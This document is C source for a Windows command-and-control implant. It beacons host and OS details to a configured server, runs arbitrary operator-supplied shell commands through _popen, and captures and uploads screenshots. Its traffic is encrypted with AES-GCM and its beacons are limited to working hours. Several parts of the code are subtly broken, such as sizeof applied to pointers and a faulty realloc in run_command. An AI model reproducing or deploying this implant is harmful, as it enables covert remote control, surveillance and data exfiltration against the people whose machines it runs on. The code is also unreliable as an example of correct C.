#include "client.h"

void log_it(const char* format, ...) {
    if (!LOGGING || !log_file)
        return;
    
    va_list args;
    va_start(args, format);

    // Get the current time
    time_t now;
    time(&now);
    char timestamp[26];
    strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", localtime(&now));

    // Print timestamp
    fprintf(log_file, "[%s] ", timestamp);

    // Print the actual message
    vfprintf(log_file, format, args);

    // Add a newline if it's not already there
    // Note: The newline character check must consider potential escape sequences in the format string.
    size_t format_len = strlen(format);
    if (format_len == 0 || format[format_len - 1] != '\n') {
        fprintf(log_file, "\n");
    }

    fflush(log_file);
    va_end(args);
}

int get_session_id(const char *ip_address, char *session_id, size_t session_id_size) {
    if (!ip_address || !session_id || session_id_size < SESSION_ID_LENGTH + 1) {
        log_it("Invalid input provided");
        return -1;
    }

    char ip_copy[MAX_IP_LEN + 1];
    snprintf(ip_copy, sizeof(ip_copy), "%s", ip_address);

    // Remove port if present
    char *port_pos = strstr(ip_copy, ":" SERVER_PORT);
    if (port_pos) *port_pos = '\0';

    // Handle IPv6 localhost
    if (strcmp(ip_copy, "::1") == 0) {
        strncpy(ip_copy, "127.0.0.1", sizeof(ip_copy) - 1);
        ip_copy[sizeof(ip_copy) - 1] = '\0';
    }

    // Calculate sum of IP parts for IPv4
    int sum = 0;
    if (strchr(ip_copy, '.')) {
        char *token = strtok(ip_copy, ".");
        while (token != NULL) {
            sum += atoi(token);
            token = strtok(NULL, ".");
        }
    }

    // Prepare hash input
    char hash_input[MAX_IP_LEN + 13];  // Extra space for "<>" and sum
    snprintf(hash_input, sizeof(hash_input), "%s<>%d", ip_address, sum);

    // Compute SHA256 hash
    unsigned char hash[SHA256_DIGEST_LENGTH];
    SHA256_CTX sha256;
    if (!SHA256_Init(&sha256) || 
        !SHA256_Update(&sha256, hash_input, strlen(hash_input)) || 
        !SHA256_Final(hash, &sha256)) {
        log_it("SHA256 computation failed");
        return -1;
    }

    // Convert hash to hex and truncate to 32 characters
    static const char hex_chars[] = "0123456789abcdef";
    for (int i = 0; i < SESSION_ID_LENGTH / 2; i++) {
        session_id[i * 2] = hex_chars[(hash[i] >> 4) & 0xF];
        session_id[i * 2 + 1] = hex_chars[hash[i] & 0xF];
    }
    session_id[SESSION_ID_LENGTH] = '\0';

    log_it("Session ID: %s", session_id);
    return 0;
}

// Function to encode base64
char* base64_encode(const unsigned char *data, size_t length) {
    BIO *bio, *b64;
    BUF_MEM *buffer_ptr;
    char *buffer;

    b64 = BIO_new(BIO_f_base64());
    BIO_set_flags(b64, BIO_FLAGS_BASE64_NO_NL); // No newlines
    bio = BIO_new(BIO_s_mem());
    bio = BIO_push(b64, bio);
    BIO_write(bio, data, length);
    BIO_flush(bio);
    BIO_get_mem_ptr(bio, &buffer_ptr);

    buffer = (char *)malloc(buffer_ptr->length + 1); // +1 for null-terminator
    memcpy(buffer, buffer_ptr->data, buffer_ptr->length);
    buffer[buffer_ptr->length] = '\0';

    BIO_free_all(bio);
    return buffer;
}

// Function to decode base64
unsigned char* base64_decode(const char *data, size_t *length) {
    BIO *bio, *b64;
    size_t len = strlen(data);
    unsigned char *buffer;

    buffer = (unsigned char *)malloc(len * 3 / 4 + 1);

    b64 = BIO_new(BIO_f_base64());
    BIO_set_flags(b64, BIO_FLAGS_BASE64_NO_NL); // No newlines
    bio = BIO_new_mem_buf(data, len);
    bio = BIO_push(b64, bio);

    *length = BIO_read(bio, buffer, len);
    buffer[*length] = '\0';

    BIO_free_all(bio);
    return buffer;
}

// Function to derive key using PBKDF2
void derive_key(const unsigned char *shared_key, unsigned char *salt, unsigned char *key) {
    PKCS5_PBKDF2_HMAC((const char *)shared_key, strlen((const char *)shared_key), salt, SALT_LENGTH, 200000, EVP_sha512(), KEY_LENGTH, key);
}

// Encryption function
char* encrypt_data(const char *data, const char *shared_key) {
    unsigned char salt[SALT_LENGTH], iv[IV_LENGTH], key[KEY_LENGTH];
    unsigned char auth_tag[TAG_LENGTH];
    unsigned char encrypted_data[1024]; // Adjust as needed
    int len, encrypted_data_len;
    EVP_CIPHER_CTX *ctx;

    // Generate random salt and IV
    RAND_bytes(salt, SALT_LENGTH);
    RAND_bytes(iv, IV_LENGTH);

    // Derive key
    derive_key((unsigned char *)shared_key, salt, key);

    // Initialize encryption context
    ctx = EVP_CIPHER_CTX_new();
    EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL);
    EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, IV_LENGTH, NULL);
    EVP_EncryptInit_ex(ctx, NULL, NULL, key, iv);

    // Encrypt the data
    if (1 != EVP_EncryptUpdate(ctx, encrypted_data, &len, (unsigned char *)data, strlen(data))) {
        EVP_CIPHER_CTX_free(ctx);
        return NULL; // Encryption failed
    }
    encrypted_data_len = len;
    if (1 != EVP_EncryptFinal_ex(ctx, encrypted_data + len, &len)) {
        EVP_CIPHER_CTX_free(ctx);
        return NULL; // Finalizing encryption failed
    }
    encrypted_data_len += len;

    // Get the authentication tag
    if (1 != EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, TAG_LENGTH, auth_tag)) {
        EVP_CIPHER_CTX_free(ctx);
        return NULL; // Getting tag failed
    }

    EVP_CIPHER_CTX_free(ctx);

    // Encode to base64
    char *salt_b64 = base64_encode(salt, SALT_LENGTH);
    char *iv_b64 = base64_encode(iv, IV_LENGTH);
    char *auth_tag_b64 = base64_encode(auth_tag, TAG_LENGTH);
    char *encrypted_data_b64 = base64_encode(encrypted_data, encrypted_data_len);

    // Prepare the result string
    char *result = (char *)malloc(strlen(salt_b64) + strlen(iv_b64) + strlen(auth_tag_b64) + strlen(encrypted_data_b64) + 4);
    sprintf(result, "%s:%s:%s:%s", salt_b64, iv_b64, auth_tag_b64, encrypted_data_b64);

    free(salt_b64);
    free(iv_b64);
    free(auth_tag_b64);
    free(encrypted_data_b64);

    return result;
}

// Decryption function
char* decrypt_data(const char *encrypted, const char *shared_key) {
    unsigned char salt[SALT_LENGTH], iv[IV_LENGTH], auth_tag[TAG_LENGTH];
    unsigned char encrypted_data[1024]; // Adjust as needed
    unsigned char key[KEY_LENGTH];
    size_t encrypted_data_len;
    EVP_CIPHER_CTX *ctx;
    int decrypted_len;
    int out_len;

    // Make a copy of the input string to avoid modifying the original
    char *encrypted_copy = strdup(encrypted);
    if (!encrypted_copy) {
        return NULL; // Memory allocation failure
    }

    // Split the encrypted string
    char *parts[4];
    char *token = strtok(encrypted_copy, ":");
    for (int i = 0; i < 4; i++) {
        if (token) {
            parts[i] = token;
            token = strtok(NULL, ":");
        } else {
            free(encrypted_copy); // Clean up
            return NULL; // Invalid input
        }
    }

    // Decode from base64
    size_t len;
    unsigned char *salt_b64 = base64_decode(parts[0], &len);
    if (len != SALT_LENGTH) {
        free(salt_b64);
        free(encrypted_copy);
        return NULL; // Decoding failed or incorrect length
    }
    memcpy(salt, salt_b64, SALT_LENGTH);
    free(salt_b64);

    unsigned char *iv_b64 = base64_decode(parts[1], &len);
    if (len != IV_LENGTH) {
        free(iv_b64);
        free(encrypted_copy);
        return NULL; // Decoding failed or incorrect length
    }
    memcpy(iv, iv_b64, IV_LENGTH);
    free(iv_b64);

    unsigned char *auth_tag_b64 = base64_decode(parts[2], &len);
    if (len != TAG_LENGTH) {
        free(auth_tag_b64);
        free(encrypted_copy);
        return NULL; // Decoding failed or incorrect length
    }
    memcpy(auth_tag, auth_tag_b64, TAG_LENGTH);
    free(auth_tag_b64);

    unsigned char *encrypted_data_b64 = base64_decode(parts[3], &len);
    encrypted_data_len = len;
    memcpy(encrypted_data, encrypted_data_b64, encrypted_data_len);
    free(encrypted_data_b64);

    // Derive key
    derive_key((unsigned char *)shared_key, salt, key);

    // Initialize decryption context
    ctx = EVP_CIPHER_CTX_new();
    if (!ctx) {
        free(encrypted_copy);
        return NULL; // Memory allocation failure
    }

    if (1 != EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL)) {
        EVP_CIPHER_CTX_free(ctx);
        free(encrypted_copy);
        return NULL; // Initialization failed
    }

    if (1 != EVP_DecryptInit_ex(ctx, NULL, NULL, key, iv)) {
        EVP_CIPHER_CTX_free(ctx);
        free(encrypted_copy);
        return NULL; // Initialization failed
    }

    // Decrypt the data
    if (1 != EVP_DecryptUpdate(ctx, encrypted_data, &decrypted_len, encrypted_data, encrypted_data_len)) {
        EVP_CIPHER_CTX_free(ctx);
        free(encrypted_copy);
        return NULL; // Decryption failed
    }

    // Set the expected tag value
    if (1 != EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_TAG, TAG_LENGTH, auth_tag)) {
        EVP_CIPHER_CTX_free(ctx);
        free(encrypted_copy);
        return NULL; // Setting tag failed
    }

    if (1 != EVP_DecryptFinal_ex(ctx, encrypted_data + decrypted_len, &out_len)) {
        EVP_CIPHER_CTX_free(ctx);
        free(encrypted_copy);
        return NULL; // Decryption failed
    }

    decrypted_len += out_len;

    EVP_CIPHER_CTX_free(ctx);

    // Null-terminate the decrypted data
    encrypted_data[decrypted_len] = '\0';
    free(encrypted_copy);
    return strdup((const char *)encrypted_data);
}

void send_command(const char* response) {
    char* encrypted = encrypt_data(response, SESSION_ID);
    if (encrypted == NULL) {
        log_it("Encryption failed");
        return;
    }
    log_it("Sending data: %s", encrypted);
    size_t encrypted_len = strlen(encrypted);
    if (encrypted_len > CHUNK_SIZE) {
        // Send the data in chunks
        while (encrypted_len > 0) {
            size_t chunk_size = (encrypted_len > CHUNK_SIZE) ? CHUNK_SIZE : encrypted_len;
            char chunk[CHUNK_SIZE + 7]; // Buffer for data chunk + '--FIN--' + null terminator

            // Copy chunk of data
            memcpy(chunk, encrypted, chunk_size);
            encrypted += chunk_size;
            encrypted_len -= chunk_size;

            if (encrypted_len == 0) {
                // Add termination marker for the last chunk
                strcat(chunk, "--FIN--");
                chunk_size += 7; // Increase chunk size to account for the '--FIN--' marker
            }

            // Send the chunk to the socket
            int result = send(client_socket, chunk, chunk_size, 0);
            if (result == SOCKET_ERROR) {
                int error_code = WSAGetLastError();
                log_it("Send failed with error: %d", error_code);
                free(encrypted); // Free after sending all data
                return;
            }
            log_it("Sent chunk successfully.");
        }
    } else {
        // If the encrypted data fits in one chunk
        int result = send(client_socket, encrypted, encrypted_len, 0);
        if (result == SOCKET_ERROR) {
            int error_code = WSAGetLastError();
            log_it("Send failed with error: %d", error_code);
        } else {
            log_it("Sent data successfully.");
        }
    }
    
    free(encrypted); // Free after sending all data
}

void send_beacon() {
    SYSTEM_INFO sysInfo;
    OSVERSIONINFOEX osInfo;
    char hostname[256];
    DWORD size = sizeof(hostname);
    // Get system information
    GetSystemInfo(&sysInfo);
    ZeroMemory(&osInfo, sizeof(OSVERSIONINFOEX));
    osInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
    GetVersionEx((LPOSVERSIONINFO)&osInfo);
    GetComputerNameA(hostname, &size);
    // Prepare the beacon message
    char beacon[300];
    const char* beacon_format = "{\"response\": {\"beacon\": true,\"version\": \"%s\",\"type\": \"%s\",\"platform\": \"Windows\",\"arch\": \"%s\",\"osver\": \"%lu.%lu.%lu\",\"hostname\": \"%s\"}}";
    const char* arch = sysInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 ? "x64" : "x86";
    // Format the beacon message into the buffer
    snprintf(beacon, sizeof(beacon), beacon_format, CVER, TYPE, arch, osInfo.dwMajorVersion, osInfo.dwMinorVersion, osInfo.dwBuildNumber, hostname);
    // Send the command with the formatted beacon message
    send_command(beacon);
}

void sleep_ms(int milliseconds) {
    Sleep(milliseconds);
}

// Function to convert UTF-8 to UTF-16
WCHAR* utf8_to_utf16(const char* str) {
    int len = MultiByteToWideChar(CP_UTF8, 0, str, -1, NULL, 0);
    WCHAR* result = malloc(len * sizeof(WCHAR));
    if (!result) return NULL;
    MultiByteToWideChar(CP_UTF8, 0, str, -1, result, len);
    return result;
}

// Function to simulate setInterval for beacon
DWORD WINAPI beacon_interval_thread(LPVOID lpParam) {
    (void)lpParam;
    while (!exit_process) {
        sleep_ms(BEACON_MIN_INTERVAL + (rand() % (BEACON_MAX_INTERVAL - BEACON_MIN_INTERVAL + 1)));
        SYSTEMTIME st;
        GetLocalTime(&st);
        // Check if it's Monday through Friday (1-5) and between 7 AM and 7 PM
        if (st.wDayOfWeek >= 1 && st.wDayOfWeek <= 5 && 
            st.wHour >= 7 && st.wHour <= 19) {
            send_beacon();
        }
    }
    return 0;
}

// Function to start beacon interval thread
HANDLE start_beacon_interval() {
    HANDLE threadHandle;
    
    // Send the first beacon
    send_beacon();
    
    // Create the thread
    threadHandle = CreateThread(NULL, 0, beacon_interval_thread, NULL, 0, NULL);
    
    // Check if the thread was created successfully
    if (threadHandle == NULL) {
        // Handle the error (optional, e.g., log the error or return NULL)
        return NULL;
    }
    
    // Return the thread handle to the caller
    return threadHandle;
}

// Function to save a bitmap as PNG
HRESULT SaveBitmapToPNG(HBITMAP hBitmap, const WCHAR* filename) {
    HRESULT hr = CoInitialize(NULL);
    if (FAILED(hr)) return hr;

    IWICImagingFactory* pFactory = NULL;
    IWICBitmap* pWICBitmap = NULL;
    IWICBitmapEncoder* pEncoder = NULL;
    IWICBitmapFrameEncode* pFrame = NULL;
    IWICStream* pStream = NULL;
    BITMAP bmp;
    void* pPixels = NULL;

    hr = CoCreateInstance(&CLSID_WICImagingFactory, NULL, CLSCTX_INPROC_SERVER, &IID_IWICImagingFactory, (LPVOID*)&pFactory);
    if (FAILED(hr)) goto cleanup;

    hr = pFactory->lpVtbl->CreateStream(pFactory, &pStream);
    if (FAILED(hr)) goto cleanup;

    hr = pStream->lpVtbl->InitializeFromFilename(pStream, filename, GENERIC_WRITE);
    if (FAILED(hr)) goto cleanup;

    GetObject(hBitmap, sizeof(BITMAP), &bmp);
    BITMAPINFO bmpInfo = { 0 };
    bmpInfo.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmpInfo.bmiHeader.biWidth = bmp.bmWidth;
    bmpInfo.bmiHeader.biHeight = bmp.bmHeight;
    bmpInfo.bmiHeader.biPlanes = 1;
    bmpInfo.bmiHeader.biBitCount = 32;
    bmpInfo.bmiHeader.biCompression = BI_RGB;

    HDC hdcScreen = GetDC(NULL);
    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    HBITMAP hOldBitmap = (HBITMAP)SelectObject(hdcMem, hBitmap);

    pPixels = malloc(bmp.bmWidth * bmp.bmHeight * 4);
    if (!pPixels) {
        hr = E_OUTOFMEMORY;
        goto cleanup;
    }

    if (!GetDIBits(hdcMem, hBitmap, 0, bmp.bmHeight, pPixels, &bmpInfo, DIB_RGB_COLORS)) {
        hr = E_FAIL;
        goto cleanup;
    }

    SelectObject(hdcMem, hOldBitmap);
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);

    WICPixelFormatGUID pixelFormat = GUID_WICPixelFormat32bppBGRA;
    hr = pFactory->lpVtbl->CreateBitmapFromMemory(pFactory, bmp.bmWidth, bmp.bmHeight, &pixelFormat, bmp.bmWidth * 4, bmp.bmWidth * bmp.bmHeight * 4, (BYTE*)pPixels, &pWICBitmap);
    if (FAILED(hr)) goto cleanup;

    hr = pFactory->lpVtbl->CreateEncoder(pFactory, &GUID_ContainerFormatPng, NULL, &pEncoder);
    if (FAILED(hr)) goto cleanup;

    hr = pEncoder->lpVtbl->Initialize(pEncoder, (IStream*)pStream, WICBitmapEncoderNoCache);
    if (FAILED(hr)) goto cleanup;

    hr = pEncoder->lpVtbl->CreateNewFrame(pEncoder, &pFrame, NULL);
    if (FAILED(hr)) goto cleanup;

    hr = pFrame->lpVtbl->Initialize(pFrame, NULL);
    if (FAILED(hr)) goto cleanup;

    hr = pFrame->lpVtbl->SetSize(pFrame, bmp.bmWidth, bmp.bmHeight);
    if (FAILED(hr)) goto cleanup;

    hr = pFrame->lpVtbl->SetPixelFormat(pFrame, &pixelFormat);
    if (FAILED(hr)) goto cleanup;

    hr = pFrame->lpVtbl->WriteSource(pFrame, (IWICBitmapSource*)pWICBitmap, NULL);
    if (FAILED(hr)) goto cleanup;

    hr = pFrame->lpVtbl->Commit(pFrame);
    if (FAILED(hr)) goto cleanup;

    hr = pEncoder->lpVtbl->Commit(pEncoder);
    
cleanup:
    if (pPixels) free(pPixels);
    if (pFrame) pFrame->lpVtbl->Release(pFrame);
    if (pEncoder) pEncoder->lpVtbl->Release(pEncoder);
    if (pWICBitmap) pWICBitmap->lpVtbl->Release(pWICBitmap);
    if (pStream) pStream->lpVtbl->Release(pStream);
    if (pFactory) pFactory->lpVtbl->Release(pFactory);
    CoUninitialize();
    return hr;
}

// Function to run the screenshot capture and processing
void run_screenshot() {
    HDC hdcScreen = GetDC(NULL);
    if (!hdcScreen) {
        fprintf(stderr, "Failed to get screen DC\n");
        return;
    }

    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    if (!hdcMem) {
        fprintf(stderr, "Failed to create compatible DC\n");
        ReleaseDC(NULL, hdcScreen);
        return;
    }

    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, screenWidth, screenHeight);

    if (!hBitmap || !BitBlt(hdcMem, 0, 0, screenWidth, screenHeight, hdcScreen, 0, 0, SRCCOPY)) {
        fprintf(stderr, "Failed to capture screenshot\n");
        DeleteObject(hBitmap);
        DeleteDC(hdcMem);
        ReleaseDC(NULL, hdcScreen);
        return;
    }

    time_t now;
    time(&now);
    char timestamp[26];
    strftime(timestamp, sizeof(timestamp), "%Y-%m-%d-%H-%M-%S", localtime(&now));

    char filename[50];
    snprintf(filename, sizeof(filename), "screenshot-%s.png", timestamp);
    wchar_t wFilename[MAX_PATH];
    MultiByteToWideChar(CP_UTF8, 0, filename, -1, wFilename, MAX_PATH);

    HRESULT hr = SaveBitmapToPNG(hBitmap, wFilename);

    DeleteObject(hBitmap);
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);

    if (SUCCEEDED(hr)) {
        // Read the file and encode it
        FILE* file = _wfopen(wFilename, L"rb");
        if (file) {
            fseek(file, 0, SEEK_END);
            long file_size = ftell(file);
            fseek(file, 0, SEEK_SET);

            unsigned char* file_data = malloc(file_size);
            if (file_data) {
                fread(file_data, 1, file_size, file);
                char* base64_data = base64_encode(file_data, file_size);
                if (base64_data) {
                    // Prepare and send the command
                    char* command = malloc(strlen(base64_data) + 100);
                    if (command) {
                        snprintf(command, strlen(base64_data) + 100, "{\"response\": {\"name\": \"%s\", \"data\": \"%s\"}}", filename, base64_data);
                        send_command(command);
                        free(command);
                    }
                    free(base64_data);
                }
                free(file_data);
            }
            fclose(file);
            _wremove(wFilename); // Optionally delete the file after sending
        }
    } else {
        fprintf(stderr, "Failed to save screenshot\n");
    }
}

// Function to handle webcam (placeholder)
void run_webcam_clip() {
    // This would require platform-specific libraries
    send_command("{\"response\": {\"error\": \"Webcam functionality not implemented\"}}");
}

// Function to parse and execute action
void parse_action(const char* action) {
    char* action_copy = _strdup(action);
    char* command = strtok(action_copy, " ");

    if (command == NULL) {
        send_command("{\"response\": {\"error\": \"No command provided\"}}");
        free(action_copy);
        return;
    }

    if (strcmp(command, "up") == 0) {
        get_uptime();
    } else if (strcmp(command, "di") == 0) {
        exit_process = TRUE;
        if (client_socket != INVALID_SOCKET) {
            closesocket(client_socket);
        }
        if (log_file) {
            fclose(log_file);
        }
        WSACleanup();
        exit(0);
    } else if (strcmp(command, "cmd") == 0 || strcmp(command, "ps") == 0) {
        char* payload = strtok(NULL, "");
        if (payload) {
            int decoded_len = EVP_DecodeBlock(NULL, (const unsigned char*)payload, strlen(payload));
            char* decoded_payload = malloc(decoded_len + 1);
            if (decoded_payload) {
                EVP_DecodeBlock((unsigned char*)decoded_payload, (const unsigned char*)payload, strlen(payload));
                decoded_payload[decoded_len] = '\0';  // Null-terminate the string
                char* result = run_command(decoded_payload);
                char* response = malloc(strlen(result) + 64);  // 64 for the JSON wrapper
                if (response) {
                    snprintf(response, sizeof(response), "{\"response\": {\"data\": \"%s\"}}", result);
                    send_command(response);
                    free(response);
                } else {
                    send_command("{\"response\": {\"error\": \"Memory allocation failed\"}}");
                }
                free(result);
                free(decoded_payload);
            } else {
                send_command("{\"response\": {\"error\": \"Memory allocation failed\"}}");
            }
        } else {
            send_command("{\"response\": {\"error\": \"No payload provided\"}}");
        }
    } else if (strcmp(command, "ss") == 0) {
        run_screenshot();
    } else if (strcmp(command, "wc") == 0) {
        run_webcam_clip();
    } else {
        char error_msg[100];
        snprintf(error_msg, sizeof(error_msg), "{\"response\": {\"error\": \"Unsupported command: %s\"}}", command);
        send_command(error_msg);
    }

    free(action_copy);
}

// Function to format file name
char* format_file_name(const char* name, const char* extension) {
    time_t now;
    struct tm tm_info;
    char timestamp[20];
    char* file_name = malloc(100);  // Adjust size as needed

    if (!file_name) {
        free(file_name);
        return NULL;
    }

    time(&now);
    localtime_s(&tm_info, &now);
    strftime(timestamp, 20, "%Y-%m-%d_%H-%M-%S", &tm_info);

    snprintf(file_name, sizeof(file_name), "%s_%s.%s", name, timestamp, extension);
    return file_name;
}

// Function to format time
char* format_time(long milliseconds) {
    long total_seconds = milliseconds / 1000;
    int days = (int)(total_seconds / 86400);
    int hours = (int)((total_seconds % 86400) / 3600);
    int minutes = (int)((total_seconds % 3600) / 60);
    int seconds = (int)(total_seconds % 60);

    char* formatted_time = malloc(50);  // Adjust size as needed
    if (!formatted_time) {
        free(formatted_time);
        return NULL;
    }
    snprintf(formatted_time, sizeof(formatted_time), "%dd %dh %dm %ds", days, hours, minutes, seconds);
    return formatted_time;
}

// Function to get uptime
void get_uptime() {
    time_t current_time;
    time(&current_time);
    long uptime_millis = (long)(difftime(current_time, start_time) * 1000);
    char* uptime = format_time(uptime_millis);
    
    if (uptime) {
        char response[256];
        snprintf(response, sizeof(response), "{\"response\": {\"data\": \"%s\"}}", uptime);
        send_command(response);
        free(uptime);
    } else {
        send_command("{\"response\": {\"error\": \"Failed to get uptime\"}}");
    }
}

// Function to run a command
char* run_command(const char* command) {
    char* output = NULL;
    size_t output_size = 0;
    char buffer[128];
    FILE* pipe = _popen(command, "r");

    if (!pipe) {
        return _strdup("Failed to run command");
    }

    while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
        size_t len = strlen(buffer);
        char* new_output = realloc(output, output_size + len + 1);
        if (!new_output) {
            free(output);
            _pclose(pipe);
            return _strdup("Memory allocation failed");
        }
        output = new_output + output_size;
        memcpy(output, buffer, len);
        output_size += len;
        // null terminate
        output[output_size] = '\0';
    }

    _pclose(pipe);
    return output ? output : _strdup("");
}

// Function to convert sockaddr to IP address and port
char* get_peer_info(SOCKET sock) {
    static char ip_str[INET6_ADDRSTRLEN]; // Static buffer to hold IP address

    struct sockaddr_storage addr;
    int addr_len = sizeof(addr);

    if (getpeername(sock, (struct sockaddr*)&addr, &addr_len) == 0) {
        if (addr.ss_family == AF_INET) {
            struct sockaddr_in* ipv4 = (struct sockaddr_in*)&addr;
            inet_ntop(AF_INET, &ipv4->sin_addr, ip_str, sizeof(ip_str));
        } else if (addr.ss_family == AF_INET6) {
            struct sockaddr_in6* ipv6 = (struct sockaddr_in6*)&addr;
            inet_ntop(AF_INET6, &ipv6->sin6_addr, ip_str, sizeof(ip_str));
        }
    } else {
        log_it("getpeername failed with error: %d\n", WSAGetLastError());
        return NULL; // Return NULL if there is an error
    }
    return ip_str; // Return the IP address string
}

int connect_to_server() {
    WSADATA wsaData;
    struct addrinfo *result = NULL, *ptr = NULL, hints;
    char port_str[6];
    int retry_count = 0;

    // Initialize Winsock
    int startupResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (startupResult != 0) {
        log_it("WSAStartup failed with error: %d", startupResult);
        return -1;
    }

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    snprintf(port_str, sizeof(port_str), "%s", SERVER_PORT);

    // Resolve the server address and port
    int addrResult = getaddrinfo(SERVER_ADDRESS, port_str, &hints, &result);
    if (addrResult != 0) {
        log_it("getaddrinfo failed with error: %d", addrResult);
        WSACleanup();
        return -1;
    }

    // Attempt to connect to an address until one succeeds
    for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {
        client_socket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
        if (client_socket == INVALID_SOCKET) {
            log_it("Socket creation failed with error: %ld", WSAGetLastError());
            continue; // Try the next address
        }

        int connectResult = connect(client_socket, ptr->ai_addr, (int)ptr->ai_addrlen);
        if (connectResult == SOCKET_ERROR) {
            closesocket(client_socket);
            client_socket = INVALID_SOCKET;
            if (retry_count >= MAX_RETRIES) {
                log_it("Connect attempt %d failed", retry_count);
                break;
            }
            log_it("Connect attempt %d failed, retrying...", retry_count);
            Sleep(1000 * retry_count); // Exponential backoff
            retry_count++;
            continue;
        }

        log_it("Client connected.");

        // Get peer information
        char* peer_ip = get_peer_info(client_socket);
        if (peer_ip) {
            strcpy(IP_ADDRESS, peer_ip);
            log_it("IP Address: %s", IP_ADDRESS);
        } else {
            log_it("Failed to get peer information.");
        }
        break;
    }

    freeaddrinfo(result);

    if (client_socket == INVALID_SOCKET) {
        log_it("Unable to connect to server after %d attempts.", MAX_RETRIES);
        WSACleanup();
        return -1;
    }

    // Set receive timeout
    DWORD timeout = 5000; // 5 seconds
    setsockopt(client_socket, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));

    // Generate and store session ID
    int sessionStatus = get_session_id(IP_ADDRESS, SESSION_ID, sizeof(SESSION_ID));
    if (sessionStatus < 0) {
        log_it("Unable to get a session ID.");
        return -1;
    }

    return 0;
}

int receive_and_process_data() {
    char buffer[CHUNK_SIZE] = {0};
    int valread = recv(client_socket, buffer, sizeof(buffer) - 1, 0);
    
    if (valread > 0) {
        buffer[valread] = '\0';
        log_it("Received Data: %s", buffer);

        char* decrypted = decrypt_data(buffer, SESSION_ID);
        if (decrypted) {
            parse_action(decrypted);
            free(decrypted);
            return 1; // Data processed successfully
        } else {
            log_it("Decryption failed");
            return 0; // Decryption failed
        }
    } else if (valread == 0) {
        log_it("Socket disconnected.");
        return -1; // Connection closed
    } else {
        if (WSAGetLastError() != WSAETIMEDOUT) {
            log_it("recv failed with error: %d", WSAGetLastError());
            return -2; // Error occurred
        }
        return 0; // Timeout, no data received
    }
}

int main() {
    log_file = fopen("client.log", "a");
    if (!log_file) {
        fprintf(stderr, "Failed to open log file\n");
        return 1;
    }

    time(&start_time);
    
    while (!exit_process) {
        if (connect_to_server() < 0) {
            log_it("Failed to connect to server");
            exit_process = TRUE;
            continue;
        }

        HANDLE beaconThreadHandle = start_beacon_interval();

        while (!exit_process) {
            int result = receive_and_process_data();
            if (result < 0) {
                // Connection closed or error occurred
                break;
            }
        }

        if (beaconThreadHandle != NULL) {
            WaitForSingleObject(beaconThreadHandle, INFINITE);
            CloseHandle(beaconThreadHandle);
        }

        if (client_socket != INVALID_SOCKET) {
            closesocket(client_socket);
            client_socket = INVALID_SOCKET;
        }
    }

    WSACleanup();
    fclose(log_file);
    return 0;
}